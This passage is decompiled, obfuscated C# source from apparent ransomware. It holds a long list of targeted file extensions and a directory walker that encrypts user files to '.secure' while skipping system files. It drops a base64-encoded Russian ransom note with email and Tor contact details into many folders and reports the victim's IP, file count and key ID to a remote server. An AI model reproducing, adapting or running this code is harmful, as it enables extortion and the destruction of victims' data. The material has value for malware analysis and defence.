				"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
				"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
				"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
				"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
				"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
				"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
				"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
				"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
				"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
				"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
				"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
				"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
				"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
				"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
				"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
				"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
				"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
				"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
				"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
				"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
				"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
				"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
				"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
				"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
				"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
				"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
				"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
				"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
				"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
				"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
				"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
				"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
				"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
				"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
				"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
				"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
				"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
				"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
				"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
				"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
				"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
				"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
				"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
				"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
				"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
				"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
				"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
				"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
				"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
				"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
				"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
				"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
				"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
				"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
				"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
				"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
				"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
				"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
				"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
				"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
				"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
				"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
				"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
				"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
				"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
				"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
				"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
				"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
				"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
				"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
				"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
				"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
				"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
				"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
				"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
				"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
				"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
				"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
				"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
				"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
				"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
				"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
				"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
				"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
				"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
				"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
				"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
				"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
				"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
				"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
				"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
				"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
				"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
				"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
				"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
				"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
				"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
				"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
				"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
				"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
				"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
				"XMLFF"
			}, new string[0], DhkyAUdEoqAPuutg(secureString), ".secure");
		}
		catch (Exception ex9)
		{
			if (vQOhJPfkmenqxsh)
			{
				try
				{
					File.AppendAllText(OpWBXzCwVRYsxq, "Finish process: " + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.txt");
				streamWriter.WriteLine(oMKRHTBqYRfOk("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyaXR5ODQ5QG51a2UuYWZyaWNhDQogDQogKtCSINC/0LjRgdGM0LzQtSDRg9C60LDQt9Cw0YLRjCDQktCw0Ygg0LvQuNGH0L3Ri9C5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGAIChLZXkgSWRlbnRpZmllcikNCiAq0J/RgNC40LrRgNC10L/QuNGC0LUgMiDRhNCw0LnQu9CwINC00L4gMiDQvNCxINC00LvRjyDRgtC10YHRgtC+0LLQvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60LguIA0KICDQvNGLINC40YUg0YDQsNGB0YjQuNGE0YDRg9C10LwsINCyINC60LDRh9C10YHRgtCy0LUg0LTQvtC60LDQt9Cw0YLQtdC70YzRgdGC0LLQsCwg0YfRgtC+INCi0J7Qm9Cs0JrQniDQnNCrINC80L7QttC10Lwg0YDQsNGB0YjQuNGE0YDQvtCy0LDRgtGMINGE0LDQudC70YsuDQoNCtCS0JDQltCd0J4hINCd0LUg0L/QuNGI0LjRgtC1INGBIG1haWwucnUgKNC6INC90LDQvCDQvdC1INC00L7RhdC+0LTRj9GCINC/0LjRjNGB0LzQsCkg0JjRgdC/0L7Qu9GM0LfRg9C50YLQtSAtIHlhbmRleC5ydSBnbWFpbC5jb20g0Lgg0YIu0LQuIA0K0JLRgdC1INC60YDQvtC80LUgbWFpbC5ydQ0KDQogLdCn0LXQvCDQsdGL0YHRgtGA0LXQtSDQstGLINGB0L7QvtCx0YnQuNGC0LUg0L3QsNC8INGB0LLQvtC5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGALCDRgtC10Lwg0LHRi9GB0YLRgNC10LUg0LzRiyDQstGL0LrQu9GO0YfQuNC8INC/0YDQvtC40LfQstC+0LvRjNC90L7QtSDRg9C00LDQu9C10L3QuNC1INGE0LDQudC70L7Qsi4NCiAt0J3QsNC/0LjRgdCw0LIg0L3QsNC8INC90LAg0L/QvtGH0YLRgyDQstGLINC/0L7Qu9GD0YfQuNGC0LUg0LTQsNC70YzQvdC10LnRiNC40LUg0LjQvdGB0YLRgNGD0LrRhtC40Lgg0L/QviDQvtC/0LvQsNGC0LUuDQoNCtCSINC+0YLQstC10YLQvdC+0Lwg0L/QuNGB0YzQvNC1INCS0Ysg0L/QvtC70YPRh9C40YLQtSDQv9GA0L7Qs9GA0LDQvNC80YMg0LTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60LguDQrQn9C+0YHQu9C1INC30LDQv9GD0YHQutCwINC/0YDQvtCz0YDQsNC80LzRiy3QtNC10YjQuNGE0YDQvtCy0YnQuNC60LAg0LLRgdC1INCS0LDRiNC4INGE0LDQudC70Ysg0LHRg9C00YPRgiDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3Riy4NCg0K0JzRiyDQs9Cw0YDQsNC90YLQuNGA0YPQtdC8Og0KMTAwJSDRg9GB0L/QtdGI0L3QvtC1INCy0L7RgdGB0YLQsNC90L7QstC70LXQvdC40LUg0LLRgdC10YUg0LLQsNGI0LjRhSDRhNCw0LnQu9C+0LINCjEwMCUg0LPQsNGA0LDQvdGC0LjRjiDRgdC+0L7RgtCy0LXRgtGB0YLQstC40Y8NCjEwMCUg0LHQtdC30L7Qv9Cw0YHQvdGL0Lkg0Lgg0L3QsNC00LXQttC90YvQuSDRgdC10YDQstC40YENCtCS0L3QuNC80LDQvdC40LUhDQogKiDQndC1INC/0YvRgtCw0LnRgtC10YHRjCDRg9C00LDQu9C40YLRjCDQv9GA0L7Qs9GA0LDQvNC80YMg0LjQu9C4INC30LDQv9GD0YHQutCw0YLRjCDQsNC90YLQuNCy0LjRgNGD0YHQvdGL0LUg0YHRgNC10LTRgdGC0LLQsA0KICog0J/QvtC/0YvRgtC60Lgg0YHQsNC80L7RgdGC0L7Rj9GC0LXQu9GM0L3QvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0YTQsNC50LvQvtCyINC/0YDQuNCy0LXQtNGD0YIg0Log0L/QvtGC0LXRgNC1INCS0LDRiNC40YUg0LTQsNC90L3Ri9GFDQogKiDQlNC10YjQuNGE0YDQsNGC0L7RgNGLINC00YDRg9Cz0LjRhSDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQuSDQvdC10YHQvtCy0LzQtdGB0YLQuNC80Ysg0YEg0JLQsNGI0LjQvNC4INC00LDQvdC90YvQvNC4LCDRgtCw0Log0LrQsNC6INGDINC60LDQttC00L7Qs9C+INC/0L7Qu9GM0LfQvtCy0LDRgtC10LvRjw0K0YPQvdC40LrQsNC70YzQvdGL0Lkg0LrQu9GO0Ycg0YjQuNGE0YDQvtCy0LDQvdC40Y8NCg0KDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YPQtNCw0LvRj9GO0YLRgdGPIDI0INGE0LDQudC70LAsINC90LXQvtCx0YXQvtC00LjQvNC+INC/0YDQuNGB0LvQsNGC0Ywg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAg0YfRgtC+0LEg0LzRiyDQvtGC0LrQu9GO0YfQuNC70Lgg0Y3RgtGDINGE0YPQvdC60YbQuNGOLg0K0JrQsNC20LTRi9C1IDI0INGH0LDRgdCwINGB0YLQvtC40LzQvtGB0YLRjCDRgNCw0YHRiNC40YTRgNC+0LLQutC4INC00LDQvdC90YvRhSDRg9Cy0LXQu9C40YfQuNCy0LDQtdGC0YHRjyDQvdCwIDMwJSAo0YfQtdGA0LXQtyA3MiDRh9Cw0YHQsCDRgdGD0LzQvNCwINGE0LjQutGB0LjRgNGD0LXRgtGB0Y8pDQoNCg0KUC5TDQrQldGB0LvQuCDQktCw0Lwg0L3QtSDQvtGC0LLQtdGC0LjQu9C4INCyINGC0LXRh9C10L3QuNC4IDQ4INGH0LDRgdC+0LIuINCS0LDQvCDQvdGD0LbQvdC+INCx0YPQtNC10YIg0YHQstGP0LfQsNGC0YzRgdGPINGBINC90LDQvNC4INC/0L4g0LTQvtC/0L7Qu9C90LjRgtC10LvRjNC90YvQvCDQutC+0L3RgtCw0LrRgtCw0LwuIA0KDQrQodC60LDRh9Cw0LnRgtC1INC4INGD0YHRgtCw0L3QvtCy0LjRgtC1IFRvciBCcm93c2VyIC0gaHR0cHM6Ly93d3cudG9ycHJvamVjdC5vcmcvcnUvZG93bmxvYWQvDQrQntGC0LrRgNC+0LnRgtC1INGH0LXRgNC10LcgVG9yIEJyb3dzZXIg0YHQsNC50YIgLSBodHRwOi8vc29uYXJtc25pa28ybHZmdS5vbmlvbiAgICjRgdCw0LnRgiDQvdC1INCx0YPQtNC10YIg0YDQsNCx0L7RgtCw0YLRjCDRh9C10YDQtdC3INC+0LHRi9GH0L3Ri9C5INCx0YDQsNGD0LfQtdGALCDRgtC+0LvRjNC60L4g0YfQtdGA0LXQtyDQotCe0KApDQrQl9Cw0YDQtdCz0LjRgdGC0YDQuNGA0YPQudGC0LXRgdGMINC4INC90LDQv9C40YjQuNGC0LUg0L3QsNC8LiANCg0KKtCd0LDRiCDQvdC40Log0LIgU29uYXInZSAtIHNhdmVmaWxlMzY1"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(oMKRHTBqYRfOk("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(nFHjUKNuaEOj);
				if (dQHMXFnCEYNSw == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(oMKRHTBqYRfOk("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(TZzJBVGXhjZB.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.txt", "\r\nAditional KeyId:\r\n" + nFHjUKNuaEOj);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in igfzwruhwWDXY)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\????????????????????.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.txt", item + "\\????????????????????.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item + "\\????????????????????.txt", "\r\nAditional KeyId:\r\n" + nFHjUKNuaEOj);
				}
			}
			catch (Exception)
			{
			}
			if (!SQFadnwkoNIbWf && num > 10)
			{
				break;
			}
		}
		if (HbxHJoiXAuWQ == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.hta");
					streamWriter2.WriteLine(oMKRHTBqYRfOk("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(oMKRHTBqYRfOk("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(nFHjUKNuaEOj + oMKRHTBqYRfOk("PC9wPg=="));
					if (dQHMXFnCEYNSw == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(oMKRHTBqYRfOk("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + oMKRHTBqYRfOk("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(TZzJBVGXhjZB.Count) + oMKRHTBqYRfOk("PC9wPg=="));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.hta", oMKRHTBqYRfOk("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + nFHjUKNuaEOj + oMKRHTBqYRfOk("PC9wPg=="));
				}
			}
			catch
			{
			}
		}
		if (jwPpkVDbeOk == "YES")
		{
			try
			{
				if (dQHMXFnCEYNSw == "NO")
				{
					BhEjWEybWo.ZoswELULsecbGti("URL", "USERNAME", "ACCESO", string.Concat(oMKRHTBqYRfOk("Q2xpZW50IElQOiA="), new WebClient().DownloadString(oMKRHTBqYRfOk("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", oMKRHTBqYRfOk("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", oMKRHTBqYRfOk("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(TZzJBVGXhjZB.Count), "\r\n", oMKRHTBqYRfOk("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), nFHjUKNuaEOj));
				}
				else
				{
					BhEjWEybWo.ZoswELULsecbGti("URL", "USERNAME", "ACCESO", string.Concat(oMKRHTBqYRfOk("Q2xpZW50IElQOiA="), new WebClient().DownloadString(oMKRHTBqYRfOk("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", oMKRHTBqYRfOk("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", oMKRHTBqYRfOk("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(TZzJBVGXhjZB.Count), "\r\n", oMKRHTBqYRfOk("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), nFHjUKNuaEOj));
				}
			}
			catch
			{
			}
		}
		if (mEzYTStgRnr == "YES")
		{
			try
			{
				CNinoMfdeOhB.vrHxdYhUAdLlHj(new Uri(""));
			}
			catch
			{
			}
		}
		if (HbxHJoiXAuWQ == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.txt"))
				{
					Process.Start(oMKRHTBqYRfOk("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.hta"))
				{
					Process.Start(oMKRHTBqYRfOk("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.hta");
				}
			}
			catch
			{
			}
		}
		if (ILHnWjQjfUkffJe == "YES")
		{
			if (EMkDRelwWGZ == "YES" && !string.IsNullOrEmpty(EhKqkDBbta) && !string.IsNullOrEmpty(hXdhfhCZQZwsD))
			{
				avpYLdZBuA(EhKqkDBbta, hXdhfhCZQZwsD);
			}
			else
			{
				avpYLdZBuA();
			}
		}
		if (fFemGrmzsojBt != "LOGONISOFF")
		{
			dMZRilCNEznH(fFemGrmzsojBt);
		}
		if (!string.IsNullOrEmpty(PKLvCQuQNcTS))
		{
			try
			{
				File.Delete(PKLvCQuQNcTS);
			}
			catch
			{
			}
		}
		if (qXKhyFzEohGXJJ)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.txt"))
				{
					string string_ = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\????????????????????.txt");
					ZSRzlUascz.NbgTuKOJrMYz(string_);
				}
			}
			catch
			{
			}
		}
		if (vQOhJPfkmenqxsh)
		{
			try
			{
				File.AppendAllText(OpWBXzCwVRYsxq, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (plsJGHfMIwqB == "EVET")
		{
			PNdHksrWsNzLSUd();
		}
	}

	public static void bzrTFBJEroUqd()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(oMKRHTBqYRfOk("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), oMKRHTBqYRfOk("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int odeHSPcZur(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> jxPpLMoTLhR(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(":\\program files\\") && !text.ToLower().Contains(":\\windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains(":\\programdata\\") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0159;
				}
			}
			catch
			{
			}
			continue;
			IL_0159:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("????????????????????") && !fileInfo.FullName.EndsWith(".secure") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(SGHDaCxgQr) && !fileInfo.FullName.Contains(OpWBXzCwVRYsxq) && !fileInfo.FullName.Contains(MwUDomDUGsVhYA))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(FIbXXLCVARq) * 1024.0 * 1024.0 && ZrRHitKveMxniC == "YES")
						{
							list.Add(fileInfo.FullName);
							vDTDGwOisXmcJ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && ZrRHitKveMxniC == "NO")
						{
							list.Add(fileInfo.FullName);
							vDTDGwOisXmcJ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string uATAppcKlZ(string XMYfRqQvHEQq = "", string eegtHWxTJETuDh = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
